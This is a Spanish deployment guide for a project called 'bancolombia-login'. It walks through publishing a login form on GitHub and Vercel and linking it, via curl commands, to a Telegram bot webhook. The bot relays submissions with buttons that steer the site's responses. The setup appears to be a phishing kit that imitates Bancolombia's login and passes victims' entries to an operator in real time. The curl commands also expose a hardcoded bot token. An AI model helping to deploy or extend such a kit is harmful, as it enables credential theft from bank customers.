# 🚀 GUÍA PASO A PASO: Subir a Vercel

## Paso 1: Preparar los archivos

Todos los archivos ya están listos:
- ✅ `index.html` - Tu formulario
- ✅ `package.json` - Dependencias
- ✅ `vercel.json` - Configuración correcta
- ✅ `api/telegram-webhook.js` - Recibe botones
- ✅ `api/telegram-response.js` - Almacena respuestas

## Paso 2: Crear cuenta GitHub (si no tienes)

1. Ve a [github.com](https://github.com)
2. Click en "Sign up"
3. Completa el registro
4. Confirma tu email

## Paso 3: Crear repositorio en GitHub

1. En GitHub, click en el `+` arriba a la derecha
2. Click en "New repository"
3. Nombre: `bancolombia-login`
4. Selecciona "Public"
5. Click en "Create repository"

## Paso 4: Subir los archivos a GitHub

### Opción A: Usando Git (recomendado)

```bash
# En tu terminal/CMD, en la carpeta del proyecto

# Configura Git (primera vez)
git config --global user.name "Tu Nombre"
git config --global user.email "tu@email.com"

# Inicializa el repositorio
git init

# Agrega todos los archivos
git add .

# Crea commit
git commit -m "Initial commit - Bancolombia Login"

# Agrega el remoto
git remote add origin https://github.com/TU_USUARIO/bancolombia-login.git

# Cambia a rama main
git branch -M main

# Sube a GitHub
git push -u origin main
```

### Opción B: Subir manualmente desde GitHub

1. En tu repositorio GitHub, click en "Add file" → "Upload files"
2. Arrastra todos tus archivos
3. Click en "Commit changes"

## Paso 5: Conectar Vercel

1. Ve a [vercel.com](https://vercel.com)
2. Click en "Sign Up" (puedes usar tu cuenta GitHub)
3. Click en "Continue with GitHub"
4. Autoriza Vercel
5. Serás redirigido al dashboard

## Paso 6: Crear proyecto en Vercel

1. Click en "New Project"
2. Busca tu repositorio `bancolombia-login`
3. Click en "Import"
4. Vercel detectará la configuración automáticamente
5. Click en "Deploy"

**Espera a que termine (2-3 minutos)**

## Paso 7: Copiar la URL de Vercel

Cuando el deploy termine, verás algo como:
```
✅ Production
https://bancolombia-login-a1b2c3d4e5f6.vercel.app
```

📌 Copia esta URL, la necesitarás después.

## Paso 8: Configurar el Webhook de Telegram

1. Abre una terminal/CMD
2. Ejecuta este comando (reemplaza los valores):

```bash
curl -X POST https://api.telegram.org/bot8656222103:AAGWGteDKnSWVQVKXk-Q8AbOnv2RWCUAfpw/setWebhook \
  -H "Content-Type: application/json" \
  -d '{"url": "https://TU_VERCEL_URL.vercel.app/api/telegram-webhook"}'
```

**Reemplaza `TU_VERCEL_URL` con tu URL de Vercel**, por ejemplo:
```bash
curl -X POST https://api.telegram.org/bot8656222103:AAGWGteDKnSWVQVKXk-Q8AbOnv2RWCUAfpw/setWebhook \
  -H "Content-Type: application/json" \
  -d '{"url": "https://bancolombia-login-a1b2c3d4e5f6.vercel.app/api/telegram-webhook"}'
```

Si funciona, verás algo como:
```json
{"ok":true,"result":true,"description":"Webhook was set"}
```

## Paso 9: Verificar que el webhook funciona

Ejecuta este comando para verificar:

```bash
curl https://api.telegram.org/bot8656222103:AAGWGteDKnSWVQVKXk-Q8AbOnv2RWCUAfpw/getWebhookInfo
```

Deberías ver:
```json
{
  "ok": true,
  "result": {
    "url": "https://bancolombia-login-a1b2c3d4e5f6.vercel.app/api/telegram-webhook",
    "has_custom_certificate": false,
    "pending_update_count": 0
  }
}
```

## ✅ ¡Listo!

Tu sitio ahora está en vivo en:
- **Frontend**: `https://TU_VERCEL_URL.vercel.app`
- **Webhook**: `https://TU_VERCEL_URL.vercel.app/api/telegram-webhook`

## 🧪 Probar

1. Accede a tu sitio (la URL de Vercel)
2. Rellena el formulario
3. El bot debería enviar un mensaje a Telegram con botones
4. Haz click en un botón
5. El sitio debería reaccionar según el botón presionado

## ⚠️ Posibles problemas

**"Webhook no recibe updates"**
- Verifica que la URL de Vercel sea correcta en el comando setWebhook
- Espera 30 segundos después de configurar el webhook

**"Error al desplegar en Vercel"**
- Verifica que `vercel.json` esté correcto
- Asegúrate de que `package.json` tenga las dependencias

**"Los botones no funcionan"**
- Verifica que el token de Telegram es correcto
- Revisa los logs en Vercel Dashboard

## 📖 Más información

- Docs de Vercel: https://vercel.com/docs
- Telegram Bot API: https://core.telegram.org/bots/api
- GitHub: https://github.com
